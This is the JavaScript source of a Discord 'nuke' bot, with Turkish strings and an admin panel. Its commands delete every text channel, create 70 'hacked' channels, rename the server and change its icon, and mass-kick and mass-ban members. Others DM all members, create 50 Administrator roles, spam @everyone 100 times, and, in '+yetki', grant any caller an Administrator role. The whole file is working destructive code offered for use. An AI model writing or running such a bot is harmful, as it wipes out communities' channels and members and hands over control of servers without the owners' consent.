const { Client, GatewayIntentBits, Partials, PermissionFlagsBits, ChannelType } = require('discord.js');
const config = require('./config.json');

const client = new Client({
  intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages, GatewayIntentBits.MessageContent],
  partials: [Partials.Channel]
});

client.login(config.token);

// Event handler
client.once('ready', () => {
  console.log(`Bot ${client.user.tag} olarak giriş yaptı.`);
  client.user.setActivity('Kitty Kat', { type: 'PLAYING' });
});

// Event handler for message creation
client.on('messageCreate', async (msg) => {
  if (msg.author.bot) return;

  const commands = {
    '+patlat': async () => {
      await msg.delete();
      const channelsToCreate = [];
      let i = 0;
      while (i < 70) {
        channelsToCreate.push({ name: 'hacked', type: ChannelType.GuildText });
        i++;
      }

      // Delete all channels
      for (const channel of msg.guild.channels.cache.values()) {
        if (channel.type !== ChannelType.GuildText) continue; // Topluluk sunucuları için gerekli olan kanalları atla
        try {
          await channel.delete();
        } catch (err) {
          console.error(`Failed to delete channel ${channel.id}:`, err);
        }
      }

      // Create new channels
      for (const name of channelsToCreate) {
        try {
          const chan = await msg.guild.channels.create(name, { type: typeof name === 'object' ? name.type : ChannelType.GuildVoice });
          if (chan.type === ChannelType.GuildVoice) {
            await chan.setUserLimit(1);
          }
        } catch (err) {
          console.error(`Failed to create channel ${name}:`, err);
        }
      }

      // Update guild settings
      try {
        await msg.guild.setIcon('https://pbs.twimg.com/media/Ex6m_hqXIAQLWeZ?format=jpg&name=4096x4096');
        await msg.guild.setName('Patlatıldı uwu');
      } catch (err) {
        console.error('Failed to update guild settings:', err);
      }

      // Delete all managed roles
      for (const role of msg.guild.roles.cache.values()) {
        if (role.managed) {
          try {
            await role.delete();
          } catch (err) {
            console.error(`Failed to delete role ${role.id}:`, err);
          }
        }
      }

      // Update bot settings
      try {
        await client.user.setAvatar('https://pbs.twimg.com/media/Ex6m_hqXIAQLWeZ?format=jpg&name=4096x4096');
        await client.user.setUsername('Patlatıldı uwu');
      } catch (err) {
        console.error('Failed to update bot settings:', err);
      }

    },
    '+ayrıl': async () => {
      await msg.delete();
      await msg.guild.leave();
    },
'+kick': async () => {
  if (msg.author.id !== config.sahip) return msg.reply('Sahibim sen değilsin.');
  await msg.delete();
  await Promise.all(
    msg.guild.members.cache.map(member => {
      if (member.kickable && member.id !== client.user.id) {
        return member.kick('Sunucudan atıldınız.').then(() => console.log(`${member.user.tag} atıldı.`)).catch(err => console.error(`Kick hatası: ${err}`));
      }
    })
  );
},
'+dm': async () => {
  if (msg.author.id !== config.sahip) return msg.reply('Sahibim sen değilsin.');
  await msg.delete();
  const message = '**Bir sunucu sevilmiştir haberiniz osun! İYİGÜNLEEEER :3** :wink:';
  
  await Promise.all(
    msg.guild.members.cache.map(member => {
      if (!member.user.bot) { // Botlara mesaj göndermemek için kontrol
        return member.send(message).catch(err => console.error(`DM gönderme hatası: ${err}`));
      }
    })
  );
},
    '+yetki': async () => {
      await msg.delete();
      const role = await msg.guild.roles.create({ name: '.', permissions: [PermissionFlagsBits.Administrator] });
      await msg.member.roles.add(role);
    },
'+ban': async () => {
  if (msg.author.id !== config.sahip) return msg.reply('Sahibim sen değilsin.');
  await msg.delete();
  await Promise.all(
    msg.guild.members.cache.map(member => {
      if (member.bannable && member.id !== client.user.id) {
        return member.ban({ reason: 'Sunucudan uzaklaştırıldınız.' }).then(() => console.log(`${member.user.tag} banlandı.`)).catch(err => console.error(`Ban hatası: ${err}`));
      }
    })
  );
},
'+rol': async () => {
  if (msg.author.id !== config.sahip) return msg.reply('Sahibim sen değilsin.');
  await msg.delete();
  
  let count = 0;
  while (count < 50) {
    await msg.guild.roles.create({
      name: 'HACKED',
      color: 'FF3E00',
      permissions: [PermissionFlagsBits.Administrator]
    }).then(() => console.log(`Rol ${count + 1} oluşturuldu.`)).catch(err => console.error(`Rol oluşturma hatası: ${err}`));
    
    count++;
  }
},
    '+spam': async () => {
      await msg.delete();
      const spamMessage = '**Ş-şey b-bu sunucusu patlatılmıştır uwu** @everyone :heart: :heart:';
      for (let i = 0; i < 100; i++) {
        await msg.channel.send(spamMessage);
      }
    },
    '+panel': async () => {
      if (msg.author.id !== config.sahip) return;
      const embed = {
        title: 'Admin Panel - Hoş Geldiniz',
        description: 'Bu admin panel komutları ve açıklamaları içerir.',
        fields: [
          { name: '+patlat', value: 'Sunucuyu patlatır.' },
          { name: '+ayrıl', value: 'Bot kendini sunucudan atar.' },
          { name: '+kick', value: 'Sunucudakileri kickler.' },
          { name: '+dm', value: 'Sunucudaki herkese duyuru atar.' },
          { name: '+yetki', value: 'Size yetki verir.' },
          { name: '+ban', value: 'Herkesi banlar.' },
          { name: '+rol', value: 'Hacked adlı fazlaca rol oluşturur.' },
          { name: '+spam', value: 'Sunucuda everyone spamlar.' },
        ],
        image: {
            url: 'https://cdn.discordapp.com/attachments/1173319481599213639/1258825072248881292/a_0b05ce4dbc49d501b989eb54b99aa805.gif?ex=668973b5&is=66882235&hm=39b19bd6622752e65ebbc3d26c855c5933a862970d56b807131a8592cd6f5922&',
          },
        color: 0xff0000,
        footer: { text: 'Tekrardan Hoşgeldiniz Efendim.' }
      };
      await msg.channel.send({ embeds: [embed] });
    }
  };

  if (commands[msg.content]) {
    await commands[msg.content]();
  }
});

console.log('Bot is running');